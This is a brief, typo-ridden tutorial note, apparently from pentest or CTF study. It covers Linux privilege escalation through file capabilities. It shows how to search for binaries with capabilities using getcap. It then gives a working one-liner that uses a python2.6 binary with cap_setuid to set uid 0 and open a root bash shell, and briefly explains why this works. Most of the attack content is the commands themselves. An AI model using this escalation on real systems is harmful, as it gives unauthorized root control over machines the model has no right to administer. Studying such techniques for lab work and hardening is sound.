Capabilities are very similar to suid,like capability means any program or binary running as capability of any other privilaged use,Then we can take advante of it to scace the privilages to that user.

to find out capabilities...

1) getcap -r / 2>/dev/null

/usr/bin/python2.6 = cap_setuid+ep


so this mean python2.6 has ability to run as root,We can take andvantage of it
by using python2.6.

2) /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# ane we're root take a look what we did...> we used python2.6 to import a librasy name os which is python module and ability to run system command maybe you're familier with, and call os.setuid(0); function to set uid as 0 and executed
  "/bin/bash" via suid 0 as suid 0 is root it will drop the shell of root.
